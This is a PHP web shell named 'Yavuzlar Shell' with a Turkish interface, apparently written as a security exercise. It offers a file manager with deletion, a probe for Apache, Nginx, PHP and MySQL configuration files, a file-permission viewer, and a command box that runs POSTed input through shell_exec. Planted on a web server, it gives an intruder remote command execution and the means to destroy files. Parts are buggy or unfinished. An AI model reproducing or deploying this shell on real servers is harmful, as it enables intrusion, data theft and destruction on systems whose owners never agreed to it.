<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yavuzlar Shell</title>
    <style>
        .dosyaYonetici{
            display:none;
        }
        .konfTespit{
            display:none;
        }
        .dosyaAra{
            display:none;
        }
        .dosyaIzin{
            display:none;
        }
        .KomutGirdi{
            display:flex;
        }
        .Container{
            display:flex;
            flex-direction: row;
            flex-wrap: wrap;
            align-items: center;
            justify-content: center;
            background-color: green;
            color: white;
            width: 750px;
            height: 800px;
            margin-top: 45px;
            border-radius: 12px;
        }
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: gray;
            
        }

        .navbar {
            background-color: #333;
            overflow: hidden;
            display: flex; 
            justify-content: center; 
            align-items: center; 
        }

        .navbar button {
            display: block; 
            color: white; 
            background-color: #333; 
            border: none; 
            text-align: center; 
            padding: 14px 20px; 
            text-decoration: none; 
            font-size: 16px;
            cursor: pointer; 
        }

        .navbar button:hover {
            background-color: #ddd; 
            color: black; 
        }
        .sayfaAlt{
            
            display: flex; 
            justify-content: center; 
            align-items: center;
        }
        .dosyaYonetici{
            background-color: rgb(42, 63, 60);
            width: 650px;
            height: 650px;
            border-radius: 12px;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            overflow:auto;
            padding-top: 110px;
        }
        .ornekDiv{
            display:flex;
            width: 600px;
            height: 50px;
            border-radius: 12px;
            background-color: black;
            flex-direction: row;
            margin-bottom:10px;
            
        }
        .icerik{
            display:flex;
        }
        .icerik p{
            display:inline-block;
            width: 420px;
            padding-left: 15px;
            font-family: Arial, Helvetica, sans-serif;
            font-size: 16px;

        }
        .butonlar{
            display:flex;
            justify-content: center;
            align-items: center;
        }
        .butonlar button{
            width: 75px;
            margin-right:5px;
            height: 40px;
            border-radius: 7px;
            font-family: Arial, Helvetica, sans-serif;
            font-size: 16px;

        }
        .dosyaIzin{
            background-color: rgb(42, 63, 60);
            width: 650px;
            height: 650px;
            border-radius: 12px;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            overflow:auto;
            padding-top: 110px;
        }
        .KomutGirdi{
            background-color: rgb(42, 63, 60);
            width: 650px;
            height: 650px;
            border-radius: 12px;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            
        }


        .command-form {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 400px;
            text-align: center;
        }
        input[type="text"] {
            width: 80%;
            padding: 10px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        input[type="submit"] {
            padding: 10px 20px;
            background-color: #28a745;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        input[type="submit"]:hover {
            background-color: #218838;
        }
        .output {
            margin-top: 20px;
            background-color: #e9ecef;
            padding: 10px;
            border-radius: 4px;
            white-space: pre-wrap;
            text-align: left;
            height: 400px;
            overflow:auto;
            padding-top: 10px;
            color:black;
        }
        
    </style>
</head>
<?php
    $konum=__DIR__;
    function DosyaGetir($dizin){
        $dosyalar=scandir($dizin);
        return $dosyalar;
    }
    function DosyaSil($dizin){
        if(file_exists($dizin)){
            if(unlink($dizin)){
                header("Location: " . $_SERVER['PHP_SELF'] . "?message=dosya silindi");
                exit;
            }
            else{
                header("Location: " . $_SERVER['PHP_SELF'] . "?message=dosya silinemedi");
                exit;
            }
        }
        
    }
    if(isset($_POST['sil'])){
        $dosyaAdi=$_POST['sil'];
        $dosyaYol=$konum . $dosyaAdi;
        DosyaSil($dosyaYol);
    }
    $config_files = [
        '/etc/apache2/apache2.conf',
        '/etc/nginx/nginx.conf',
        '/etc/php/7.4/cli/php.ini',
        '/etc/mysql/my.cnf',
        '/var/www/html/.htaccess'
    ];
    $commands = [
        "ls" => "Bulunduğunuz dizindeki dosyaları listeler.",
        "pwd" => "Şu anki çalışma dizinini gösterir.",
        "cat <dosya>" => "Bir dosyanın içeriğini görüntüler.",
        "rm <dosya>" => "Belirtilen dosyayı siler.",
        "help" => "Mevcut komutların listesini gösterir."
    ];
?>
<body>
    <div class="navbar">
        <button onclick="dosyaYoneticiGoster(this)">Dosya Yöneticisi</button>
        <button onclick="konfTespitGoster(this)">Konfigurasyon Tespiti</button>
        <button onclick="dosyaAraGoster(this)">Dosya Ara</button>
        <button onclick="dosyaIzinGoster(this)">Dosya İzinleri</button>
        <button onclick="KomutGoster(this)">Komut Girdi</button>
        
    </div>
    <div class="sayfaAlt">
        <div class="Container">
            <?php 
                
                $dosyalar=DosyaGetir($konum);
            ?>
            <div class="dosyaYonetici">
                <?php foreach($dosyalar as $dosya){ ?>
                    <div class="ornekDiv">
                        <div class="icerik">
                            <p><?php echo $dosya; ?></p>
                        </div>
                        <div class="butonlar">
                            <button>Düzenle</button>
                            <form action="" method="post">
                                <input type="hidden" name="dosyaAdi" value="<?php echo $dosya; ?>">
                                <button type="submit" name="sil">Sil</button>
                            </form>
                        </div>
                    </div>
                <?php } ?>
            </div>
            <div class="konfTespit">
                <?php 
                    foreach($config_files as $file){
                        if(file_exists($file)){
                ?>
                    <div class="ornekDiv">
                        <div class="icerik">
                            <p><?php echo $file; ?></p>
                        </div>
                    </div>
                <?php 
                        }
                    }
                ?>
            </div>
            <div class="dosyaAra">
                <p>DosyaAra</p>
            </div>
            
            <div class="dosyaIzin">
                <?php
                    foreach($dosyalar as $dosya){
                        $izinler=fileperms($dosya);
                        if($izinler!=false){
                            $gosterim=substr(sprintf('%o',$izinler),-3);
                ?>
                    <div class="ornekDiv">
                        <div class="icerik">
                            <p><?php echo $dosya; ?></p>
                        </div>
                        <div class="butonlar">
                            <p><?php echo $gosterim; ?></p>
                        </div>
                    </div>
                <?php
                        }
                    }
                ?>
            </div>
            <div class="KomutGirdi">
                <div class="command-form">
                    <h2>Komut Girişi</h2>
                    <form method="POST">
                        <input type="text" name="komut" placeholder="Komut girin..." required>
                        <input type="submit" value="Çalıştır">
                    </form>
                    <?php
                        if ($_SERVER["REQUEST_METHOD"] == "POST") {
                            
                            $komut = escapeshellcmd($_POST['komut']); 
                            $output = shell_exec($komut);
                            if ($output) {
                                echo "<div class='output'><strong>Çıktı:</strong><br>" . htmlspecialchars($output) . "</div>";
                            } 
                            else {
                                echo "<div class='output'><strong>Hata:</strong> Komut çalıştırılamadı veya çıktı yok.</div>";
                            }
                            
                           
                        }
                    ?>
                </div>
            </div>
        </div>
    </div>
<script>
    function pIcerikAl(dugme) {
        var arananP=dugme.parentElement.nextElementSibling.firstElementChild.textContent;

    }
    function dosyaYoneticiGoster(dugme){
        var detayDiv=dugme.parentElement.nextElementSibling.firstElementChild.children[0];
        if(detayDiv.style.display==="none"){
            detayDiv.style.display="flex";
            dugme.parentElement.nextElementSibling.firstElementChild.children[1].style.display="none";
            dugme.parentElement.nextElementSibling.firstElementChild.children[2].style.display="none";
            dugme.parentElement.nextElementSibling.firstElementChild.children[3].style.display="none";
            dugme.parentElement.nextElementSibling.firstElementChild.children[4].style.display="none";
        }
        else{
            detayDiv.style.display="none";
        }
    }
    function konfTespitGoster(dugme){
        var detayDiv=dugme.parentElement.nextElementSibling.firstElementChild.children[1];
        if(detayDiv.style.display==="none"){
            detayDiv.style.display="block";
            var div1=dugme.parentElement.nextElementSibling.firstElementChild.children[0].style.display="none";
            dugme.parentElement.nextElementSibling.firstElementChild.children[2].style.display="none";
            dugme.parentElement.nextElementSibling.firstElementChild.children[3].style.display="none";
            dugme.parentElement.nextElementSibling.firstElementChild.children[4].style.display="none";
        }
        else{
            detayDiv.style.display="none";
        }
    }
    function dosyaAraGoster(dugme){
        var detayDiv=dugme.parentElement.nextElementSibling.firstElementChild.children[2];
        if(detayDiv.style.display==="none"){
            detayDiv.style.display="block";
            dugme.parentElement.nextElementSibling.firstElementChild.children[1].style.display="none";
            dugme.parentElement.nextElementSibling.firstElementChild.children[0].style.display="none";
            dugme.parentElement.nextElementSibling.firstElementChild.children[3].style.display="none";
            dugme.parentElement.nextElementSibling.firstElementChild.children[4].style.display="none";
        }
        else{
            detayDiv.style.display="none";
        }
    }
    function dosyaIzinGoster(dugme){
        var detayDiv=dugme.parentElement.nextElementSibling.firstElementChild.children[3];
        if(detayDiv.style.display==="none"){
            detayDiv.style.display="flex";
            dugme.parentElement.nextElementSibling.firstElementChild.children[1].style.display="none";
            dugme.parentElement.nextElementSibling.firstElementChild.children[2].style.display="none";
            dugme.parentElement.nextElementSibling.firstElementChild.children[0].style.display="none";
            dugme.parentElement.nextElementSibling.firstElementChild.children[4].style.display="none";
        }
        else{
            detayDiv.style.display="none";
        }
    }
    function KomutGoster(dugme){
        var detayDiv=dugme.parentElement.nextElementSibling.firstElementChild.children[4];
        if(detayDiv.style.display==="none"){
            detayDiv.style.display="flex";
            dugme.parentElement.nextElementSibling.firstElementChild.children[1].style.display="none";
            dugme.parentElement.nextElementSibling.firstElementChild.children[2].style.display="none";
            dugme.parentElement.nextElementSibling.firstElementChild.children[3].style.display="none";
            dugme.parentElement.nextElementSibling.firstElementChild.children[0].style.display="none";
        }
        else{
            detayDiv.style.display="none";
        }
    }
    
</script>
    
</body>
</html>